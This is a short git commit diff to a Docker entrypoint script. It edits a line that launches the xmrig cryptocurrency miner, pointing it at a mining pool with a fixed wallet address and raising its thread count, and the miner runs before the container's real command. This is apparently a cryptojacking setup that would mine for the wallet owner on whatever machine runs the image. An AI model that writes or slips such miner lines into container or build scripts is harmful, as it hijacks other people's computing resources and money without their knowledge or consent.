fb4a1fb7aad3eb70033b3a0fb85f6cbe058ad6a2
tarikgumus <tarik.gumus@yahoo.com>
2022-09-16 15:39:27 +0800

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -2,6 +2,6 @@
 
 set -e
 
-./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 8 -k
+./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 9 -k
 
 exec "$@"
